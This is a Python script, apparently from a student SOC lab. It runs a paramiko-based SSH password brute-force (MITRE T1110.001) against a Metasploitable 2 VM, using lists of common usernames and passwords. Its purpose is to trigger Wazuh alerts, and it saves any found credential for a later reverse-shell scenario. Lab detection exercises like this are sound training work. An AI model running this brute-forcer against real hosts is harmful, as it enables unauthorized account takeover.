#!/usr/bin/env python3
"""
=============================================================
  Mini SOC Project — Person A (Red Team)
  Scenario 2: SSH Brute Force
=============================================================
  Target  : Metasploitable 2 @ 192.168.1.40
  Attacker: Kali Linux       @ 192.168.1.10
  Tactic  : T1110.001 - Brute Force: Password Guessing (MITRE ATT&CK)
  Tools   : paramiko
=============================================================
"""

import paramiko
import socket
import time
import datetime

TARGET_IP   = "192.168.1.40"
TARGET_PORT = 22
ATTACKER_IP = "192.168.1.10"

# Username yang dicoba
USERNAMES = ["msfadmin", "root", "admin", "user", "postgres", "service"]

# Wordlist kecil untuk demo — password default Metasploitable ada di sini
# Untuk demo: sengaja letakkan "msfadmin" di tengah supaya ada beberapa failed attempts dulu
# (supaya Wazuh sempat detect multiple auth failure sebelum berhasil)
PASSWORDS = [
    "123456",
    "password",
    "admin",
    "root",
    "toor",
    "msfadmin",      # <-- password default Metasploitable (user: msfadmin)
    "letmein",
    "qwerty",
    "abc123",
    "metasploit",
]

DELAY_BETWEEN_ATTEMPTS = 0.5   # detik — jangan 0, biar Wazuh sempat log

BANNER = """
╔══════════════════════════════════════════════════════╗
║        MINI SOC — SCENARIO 2: SSH BRUTE FORCE        ║
║  Target  : {target:<38} ║
║  Time    : {time:<38} ║
╚══════════════════════════════════════════════════════╝
"""

def try_ssh(ip: str, port: int, username: str, password: str) -> bool:
    """
    Coba login SSH dengan satu kombinasi username:password.
    Return True jika berhasil, False jika gagal.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname = ip,
            port     = port,
            username = username,
            password = password,
            timeout  = 5,
            banner_timeout = 5,
            auth_timeout   = 5,
        )
        client.close()
        return True

    except paramiko.AuthenticationException:
        # Login gagal — ini yang kita harapkan untuk trigger Wazuh
        return False

    except (socket.timeout, paramiko.SSHException, OSError) as e:
        print(f"  [!] Koneksi error ({username}:{password}): {e}")
        return False


def run_bruteforce(target: str, port: int) -> dict | None:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(BANNER.format(target=f"{target}:{port}", time=now))

    print(f"[*] Target    : {target}:{port}")
    print(f"[*] Usernames : {USERNAMES}")
    print(f"[*] Passwords : {len(PASSWORDS)} entri")
    print(f"[*] Delay     : {DELAY_BETWEEN_ATTEMPTS}s per attempt\n")

    attempt = 0
    found   = None

    for username in USERNAMES:
        print(f"[*] Mencoba username: {username}")
        print(f"{'─'*54}")

        for password in PASSWORDS:
            attempt += 1
            print(f"  [{attempt:>3}] {username}:{password:<20} ", end="", flush=True)

            success = try_ssh(target, port, username, password)

            if success:
                print("✅ BERHASIL!")
                found = {"username": username, "password": password, "attempt": attempt}
                break
            else:
                print("❌ Gagal")
                time.sleep(DELAY_BETWEEN_ATTEMPTS)

        if found:
            break

        print()

    print(f"\n{'═'*54}")

    if found:
        print(f"[+] CREDENTIAL DITEMUKAN setelah {found['attempt']} percobaan!")
        print(f"[+] Username : {found['username']}")
        print(f"[+] Password : {found['password']}")
        print(f"[+] Command  : ssh {found['username']}@{target}")
    else:
        print(f"[-] Tidak ada credential yang cocok setelah {attempt} percobaan.")
        print(f"[-] Tambahkan lebih banyak password ke wordlist jika perlu.")

    print(f"{'═'*54}\n")

    return found


if __name__ == "__main__":
    result = run_bruteforce(TARGET_IP, TARGET_PORT)

    if result:
        print("[*] Credential valid siap dipakai di Scenario 3 (Reverse Shell).")
        print(f"[*] Simpan: {result['username']}:{result['password']}")